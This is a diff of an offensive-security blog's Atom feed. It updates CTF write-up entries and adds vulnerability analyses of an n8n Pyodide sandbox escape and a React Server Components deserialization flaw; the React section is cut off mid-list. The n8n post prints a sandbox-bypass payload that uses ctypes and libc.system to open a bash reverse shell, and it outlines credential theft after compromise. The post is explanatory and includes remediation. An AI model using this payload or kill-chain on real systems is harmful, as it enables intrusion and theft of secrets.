@@ -5,7 +5,7 @@
   <subtitle>Offensive Security Researcher · Malware Developer &amp; Analyst · Exploit Developer · CTF Player</subtitle>
   <link href="http://localhost:4000/atom.xml" rel="self"/>
   <link href="http://localhost:4000/"/>
-  <updated>2026-05-12T23:40:28+02:00</updated>
+  <updated>2026-05-14T06:04:45+02:00</updated>
   <id>http://localhost:4000/</id>
   <author>
     <name>tralsesec</name>
@@ -58,128 +58,10 @@
   </entry>
   
   <entry>
-    <title>HackTheBox: Redelegate</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-redelegate/"/>
-    <updated>2026-05-14T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-redelegate/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Craft</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-craft/"/>
-    <updated>2026-05-14T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-craft/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Authority</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-authority/"/>
-    <updated>2026-05-14T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-authority/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: VulnCicada</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-vulncicada/"/>
-    <updated>2026-05-13T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-vulncicada/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Voleur</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-voleur/"/>
-    <updated>2026-05-13T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-voleur/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Media</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-media/"/>
-    <updated>2026-05-13T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-media/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-
-</content>
-  </entry>
-  
-  <entry>
-    <title>HackTheBox: Administrator</title>
-    
-    <link href="http://localhost:4000/ctfs/htb-administrator/"/>
-    <updated>2026-05-13T00:00:00+02:00</updated>
-    <id>http://localhost:4000/ctfs/htb-administrator/</id>
-
-    
-    
-      <category term="Mission Log" label="CTF" />
-    
-    
-    <content type="html">&lt;p&gt;Coming soon.&lt;/p&gt;
-
-</content>
-  </entry>
-  
-  <entry>
     <title>CTF Writeups</title>
     
     <link href="http://localhost:4000/ctfs/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/ctfs/</id>
 
     
@@ -534,7 +416,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
 &lt;div class=&quot;ctf-card&quot; style=&quot;border: 1px solid var(--border); margin-bottom: 2.5rem; background: #0a0a0a; position: relative; overflow: hidden; display: flex; flex-direction: column;&quot;&gt;
   
   &lt;div style=&quot;width: 100%; height: 180px; overflow: hidden; border-bottom: 1px solid var(--border); background: #111;&quot;&gt;
-    &lt;a href=&quot;/ctfs/htb-media/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;&quot; alt=&quot;HackTheBox: Media&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
+    &lt;a href=&quot;/ctfs/htb-media/&quot; style=&quot;color: var(--accent); border: none;&quot;&gt;&lt;img src=&quot;/assets/img/ctf/media.png&quot; alt=&quot;HackTheBox: Media&quot; style=&quot;width: 100%; height: 100%; object-fit: cover; opacity: 0.6;&quot; /&gt;&lt;/a&gt;
   &lt;/div&gt;
 
   &lt;div style=&quot;padding: 1.5rem;&quot;&gt;
@@ -563,11 +445,51 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     &lt;/div&gt;
 
     &lt;div style=&quot;font-size: 0.9rem; line-height: 1.6; margin-bottom: 1.5rem;&quot;&gt;
-      Coming soon.
+      🎯 Media
 
     &lt;/div&gt;
 
     &lt;div style=&quot;display: flex; flex-wrap: wrap; gap: 8px;&quot;&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Windows
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #NTLM-Leak
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #mklink
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #symlink
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Broken-Access-Control
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Arbitrary-File-Upload
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #RCE
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #SeImpersonatePrivilege
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #FullPowers
+      &lt;/span&gt;
+      
+      &lt;span style=&quot;font-family: var(--font-mono); font-size: 0.6rem; background: rgba(255,255,255,0.05); border: 1px solid #333; padding: 2px 6px;&quot;&gt;
+        #Potato
+      &lt;/span&gt;
       
     &lt;/div&gt;
 
@@ -1227,7 +1149,7 @@ Detailed post-exploitation analysis and writeups for various platforms. These re
     <title>AdonisJS BodyParser</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/9/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/9/</id>
 
     
@@ -1373,7 +1295,7 @@ module.exports = function() {
     <title>EternalBlue</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/8/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/8/</id>
 
     
@@ -1552,7 +1474,7 @@ module.exports = function() {
     <title>MongoBleed</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/7/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/7/</id>
 
     
@@ -1662,7 +1584,7 @@ module.exports = function() {
     <title>AsyncOS Quarantine Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/6/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/6/</id>
 
     
@@ -1773,7 +1695,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>FortiWeb Edge Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/5/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/5/</id>
 
     
@@ -1900,7 +1822,7 @@ Instead of a legitimate request, the attacker constructs a payload that closes t
     <title>iOS26 &quot;Liquid Glass&quot; Exploitation Chain</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/4/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/4/</id>
 
     
@@ -2036,7 +1958,7 @@ The final flaw allows the attacker to escape the sandbox via an &lt;strong&gt;In
     <title>Firefox IPC Sandbox Escape</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/3/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/3/</id>
 
     
@@ -2172,7 +2094,7 @@ Validating that an input is an “Integer” is insufficient when that integer c
     <title>Lazarus 0day (AppLocker LPE)</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/2/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/2/</id>
 
     
@@ -2272,7 +2194,7 @@ The driver accepted the IOCTL and processed the pointer regardless of the caller
     <title>The MAESTRO Breakout: ESXi Ring -1 Compromise</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/12/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/12/</id>
 
     
@@ -2538,7 +2460,7 @@ Finally, the ease with which the attackers bridged the gap from User Mode to Ker
     <title>PS5 Hypervisor Collapse</title>
     
     <link href="http://localhost:4000/anatomy-of-a-bug/md/11/"/>
-    <updated>2026-05-12T23:40:28+02:00</updated>
+    <updated>2026-05-14T06:04:45+02:00</updated>
     <id>http://localhost:4000/anatomy-of-a-bug/md/11/</id>
 
     
@@ -2723,6 +2645,845 @@ Software sandboxing is no longer sufficient for legacy compatibility layers.&lt;
   &lt;li&gt;&lt;strong&gt;The Flaw:&lt;/strong&gt; Running an emulator as a process within the main OS (even with reduced privileges) exposes the Kernel syscall interface to the legacy code.&lt;/li&gt;
   &lt;li&gt;&lt;strong&gt;The Solution:&lt;/strong&gt; Legacy environments should ideally be restricted to &lt;strong&gt;Isolated Hardware Contexts&lt;/strong&gt;. This means utilizing IOMMU groups to strictly limit what memory the legacy process can address, or offloading legacy execution to separate, lower-privileged cores that physically cannot access the primary hypervisor’s memory space. If you must support 20-year-old code, treat it as hostile malware by default.&lt;/li&gt;
 &lt;/ul&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>N8scape</title>
+    
+    <link href="http://localhost:4000/anatomy-of-a-bug/md/10/"/>
+    <updated>2026-05-14T06:04:45+02:00</updated>
+    <id>http://localhost:4000/anatomy-of-a-bug/md/10/</id>
+
+    
+    
+      <category term="Intelligence" label="AnatomyOfABug" />
+    
+    
+    <content type="html">&lt;h2 id=&quot;1-the-patient&quot;&gt;1. The Patient&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;n8n&lt;/code&gt; (Workflow Automation Tool)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Component:&lt;/strong&gt; Python Code Node (Pyodide Execution Environment)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Vector:&lt;/strong&gt; Authenticated Remote Code Execution (Post-Auth), escalatable to Unauthenticated via Chaining.&lt;/p&gt;
+
+&lt;p&gt;n8n functions as the “Central Nervous System” of modern enterprise stacks. It acts as an &lt;strong&gt;Automation Control Plane&lt;/strong&gt;, designed to ingest data from one source (e.g., a PostgreSQL database), process it, and route it to another (e.g., Salesforce, Slack, or AWS Lambda).&lt;/p&gt;
+
+&lt;p&gt;To facilitate complex data manipulation, n8n introduced “Code Nodes,” allowing users to write custom JavaScript or Python scripts within their workflows. In self-hosted environments, this presents the classic “Untrusted Code Execution” problem. The platform must execute user-defined logic while preventing that logic from accessing the host operating system.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;The Hub-and-Spoke Risk Model&lt;/strong&gt;
+The compromise of an n8n instance is mathematically distinct from a standard web server breach. Because n8n requires stored credentials to function, a compromise of the “Hub” (n8n) grants immediate, authenticated access to every “Spoke” (connected API/Service).&lt;/p&gt;
+
+  &lt;p&gt;In this incident, the “N8scape” vulnerability (CVE-2025-68668) shattered the boundary between the user’s script and the server’s kernel.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;2-the-diagnosis&quot;&gt;2. The Diagnosis&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Root Cause:&lt;/strong&gt; Reliance on Blocklisting for Dynamic Language Isolation (CWE-693) and Unrestricted FFI Access.&lt;/p&gt;
+
+&lt;p&gt;The vulnerability stems from the architectural decision to run Python code using &lt;strong&gt;Pyodide&lt;/strong&gt;—a port of CPython to WebAssembly (Wasm)—directly inside the main Node.js process. While Wasm offers a memory-safe sandbox by default, n8n needed to bridge data between Node.js and Python to make the tool useful. To secure this, they relied on a &lt;strong&gt;Blocklist (Denylist)&lt;/strong&gt; strategy, attempting to forbid specific Python modules (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess&lt;/code&gt;) and JavaScript bridges.&lt;/p&gt;
+
+&lt;h3 id=&quot;bug-a-the-blocklist-fallacy&quot;&gt;Bug A: The Blocklist Fallacy&lt;/h3&gt;
+
+&lt;p&gt;Python is a highly introspective language. Relying on a static list of “bad words” to prevent malicious behavior is structurally flawed. The “N8scape” exploit bypassed the initial static analysis/filter by utilizing an internal API function: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_pyodide._base.eval_code()&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;By passing the malicious payload as a string to this internal evaluator, the code bypasses the surface-level token scanners that look for forbidden imports.&lt;/p&gt;
+
+&lt;h3 id=&quot;bug-b-the-ctypes-bridge&quot;&gt;Bug B: The ctypes Bridge&lt;/h3&gt;
+
+&lt;p&gt;The fatal flaw was leaving the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctypes&lt;/code&gt; library accessible within the Pyodide environment. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctypes&lt;/code&gt; is Python’s Foreign Function Interface (FFI) library. It allows Python code to call functions in shared libraries (DLLs/.so) and manipulate C-data types in memory.&lt;/p&gt;
+
+&lt;p&gt;In a standard Wasm environment, loading external libraries is restricted. However, because Pyodide was running inside a Node.js host with specific Emscripten configurations, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctypes&lt;/code&gt; could still access the memory space of the running process.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;The Mechanics of the Escape:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;Memory Access:&lt;/strong&gt; The attacker uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ctypes.CDLL(None)&lt;/code&gt;. In POSIX systems (and their emulations), passing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;None&lt;/code&gt; returns a handle to the main executable and its global symbol table.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Symbol Resolution:&lt;/strong&gt; The attacker resolves the address of the C standard library function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system()&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Execution:&lt;/strong&gt; The attacker calls this function directly from memory, bypassing the Python &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.system&lt;/code&gt; wrapper entirely.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The blocklist prevented the &lt;em&gt;high-level&lt;/em&gt; Python call (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.system&lt;/code&gt;), but failed to prevent the &lt;em&gt;low-level&lt;/em&gt; memory call (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.system&lt;/code&gt;) that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;os.system&lt;/code&gt; wraps.&lt;/p&gt;
+
+&lt;h2 id=&quot;3-the-kill-chain&quot;&gt;3. The Kill-Chain&lt;/h2&gt;
+
+&lt;p&gt;While CVE-2025-68668 requires authentication, the true devastation of this incident was its deployment in a chain alongside CVE-2026-21858.&lt;/p&gt;
+
+&lt;h3 id=&quot;phase-1-the-confusion-unauthenticated-recon&quot;&gt;Phase 1: The Confusion (Unauthenticated Recon)&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Vuln:&lt;/strong&gt; CVE-2026-21858 (Arbitrary File Read)&lt;/p&gt;
+
+&lt;p&gt;The attacker targets an n8n Webhook endpoint. Due to a logic flaw in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;multipart/form-data&lt;/code&gt; parser, a crafted request confuses the server into treating a JSON body as a file upload configuration. This allows the attacker to overwrite the internal file-handling config and force the server to “read” a sensitive local file (like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/node/.n8n/config&lt;/code&gt; or the SQLite database) and return it in the webhook response.&lt;/p&gt;
+
+&lt;h3 id=&quot;phase-2-the-escalation-credential-theft&quot;&gt;Phase 2: The Escalation (Credential Theft)&lt;/h3&gt;
+
+&lt;p&gt;From the stolen database or config file, the attacker extracts the administrator password hash or session tokens. They use this to log into the n8n dashboard with full administrative privileges.&lt;/p&gt;
+
+&lt;h3 id=&quot;phase-3-the-injection-n8scape-deployment&quot;&gt;Phase 3: The Injection (N8scape Deployment)&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Vuln:&lt;/strong&gt; CVE-2025-68668 (Sandbox Escape)&lt;/p&gt;
+
+&lt;p&gt;The attacker creates a new workflow and adds a Python Code Node. They inject the payload designed to bypass the Pyodide restrictions:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_pyodide._base&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# The payload is wrapped in a string to evade static analysis
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+import ctypes
+# 1. Load the main process symbol table
+#    This bypasses the need to import &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; or &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;subprocess&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;
+libc = ctypes.CDLL(None)
+
+# 2. Execute a reverse shell via the C library&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s system() function
+#    The sandbox watches Python, but it cannot watch raw memory calls.
+libc.system(b&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bash -c &lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/443 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;)
+&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&quot;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# 3. Tunnel the payload through the internal evaluator
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_pyodide&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;eval_code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;phase-4-the-total-compromise&quot;&gt;Phase 4: The Total Compromise&lt;/h3&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.system&lt;/code&gt; call executes with the privileges of the n8n process. The attacker gains a reverse shell. From here, they can:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Dump &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;env&lt;/code&gt; to steal AWS keys, Stripe secrets, and Database credentials.&lt;/li&gt;
+  &lt;li&gt;Pivot to internal networks (SSRF/Tunneling) using n8n as a jump box.&lt;/li&gt;
+  &lt;li&gt;Modify legitimate workflows to silently exfiltrate future business data.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;4-the-fix&quot;&gt;4. The Fix.&lt;/h2&gt;
+
+&lt;p&gt;The remediation represents a fundamental shift in architecture, moving from &lt;strong&gt;Thread Isolation&lt;/strong&gt; (fragile) to &lt;strong&gt;Process Isolation&lt;/strong&gt; (robust).&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;The Legacy Architecture (Vulnerable):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Mechanism:&lt;/strong&gt; Pyodide (Wasm) inside the Main Process.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Security:&lt;/strong&gt; Blocklists/Monkey-patching.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Failure:&lt;/strong&gt; Shared memory space and FFI allowed escape.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;The v2.0.0 Architecture (Secure):&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Mechanism:&lt;/strong&gt; Task Runners.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Security:&lt;/strong&gt; Native Python processes isolated via IPC.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Success:&lt;/strong&gt; The user code runs in a completely separate process (or container). Even if they escape the Python sandbox, they are trapped in an ephemeral, low-privilege “Runner” process that has no access to the main application’s memory or secrets.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;strong&gt;Immediate Remediation Code:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;For users unable to upgrade to v2.0.0 immediately, n8n introduced environment flags to force the use of external runners in v1.x versions:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Force the use of external task runners (Process Isolation)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;N8N_RUNNERS_ENABLED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true
+export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;N8N_NATIVE_PYTHON_RUNNER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# OR: Disable Python entirely if runners cannot be deployed&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;N8N_PYTHON_ENABLED&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;5-developers-takeaway&quot;&gt;5. Developer’s Takeaway&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;The Death of the Blocklist.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;This vulnerability serves as a definitive tombstone for blocklist-based sandboxing in dynamic languages. If a language allows Introspection (inspecting itself) or FFI (calling C code), it is mathematically impossible to secure it by forbidding specific function names.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;The “Trusted” Infrastructure Fallacy.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Organizations often treat automation tools as “Internal Trusted Apps.” N8scape demonstrates that these tools are actually &lt;strong&gt;Hostile Multi-Tenant Environments&lt;/strong&gt;. Even if the tenants are your own employees, the execution environment must be hardened as if it were a public cloud provider. Code execution nodes should never share process memory with the application holding the keys to the kingdom.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Strategic Pivot:&lt;/strong&gt;
+Security Architects must audit all Low-Code/No-Code (LCNC) platforms in their stack. If the platform executes code, ask: &lt;em&gt;Does this run in a Thread or a Container?&lt;/em&gt; If the answer is Thread, assume it is already compromised.&lt;/p&gt;
+</content>
+  </entry>
+  
+  <entry>
+    <title>React2Shell RCE</title>
+    
+    <link href="http://localhost:4000/anatomy-of-a-bug/md/1/"/>
+    <updated>2026-05-14T06:04:45+02:00</updated>
+    <id>http://localhost:4000/anatomy-of-a-bug/md/1/</id>
+
+    
+    
+      <category term="Intelligence" label="AnatomyOfABug" />
+    
+    
+    <content type="html">&lt;h2 id=&quot;1-the-patient&quot;&gt;1. The Patient&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Target:&lt;/strong&gt; React2Shell (Next.js / React Server Components) 
+&lt;strong&gt;Component:&lt;/strong&gt; Flight Protocol Parser
+&lt;strong&gt;Vector:&lt;/strong&gt; HTTP Request (Insecure Deserialization)&lt;/p&gt;
+
+&lt;p&gt;React2Shell is a critical vulnerability affecting the ecosystem of &lt;strong&gt;Next.js&lt;/strong&gt; and &lt;strong&gt;React Server Components&lt;/strong&gt;. The core issue lies in the &lt;strong&gt;Flight Protocol&lt;/strong&gt;, a streaming format designed to replace static JSON for server-client communication.&lt;/p&gt;
+
+&lt;p&gt;While JSON is safe because it is static, Flight allows the parser to &lt;strong&gt;dynamically reconstruct&lt;/strong&gt; the object structure at runtime. This dynamic capability was exploited to create a massive Deserialization flaw.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;The Context:&lt;/strong&gt; This is a &lt;strong&gt;CVSS 10.0&lt;/strong&gt; vulnerability. It requires &lt;strong&gt;No Authentication&lt;/strong&gt;, &lt;strong&gt;No User Interaction&lt;/strong&gt;, and can be triggered by a single HTTP request, resulting in &lt;strong&gt;Full Shell Access&lt;/strong&gt; on the server.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;2-the-diagnosis&quot;&gt;2. The Diagnosis&lt;/h2&gt;
+
+&lt;p&gt;&lt;strong&gt;Root Cause:&lt;/strong&gt; Insecure Deserialization via Prototype Traversal.&lt;/p&gt;
+
+&lt;p&gt;Attackers do not view JavaScript objects as code; they view them as a network of &lt;strong&gt;references&lt;/strong&gt;. The goal is to traverse from a basic object up to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Function&lt;/code&gt; constructor, which allows arbitrary code execution.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;The Protocol:&lt;/strong&gt; The Flight Protocol sends data in chunks with gaps and references (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$id&lt;/code&gt;).&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;The Flaw:&lt;/strong&gt; When parsing these references, React used standard square bracket notation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;obj[key]&lt;/code&gt;) to access properties.&lt;/li&gt;
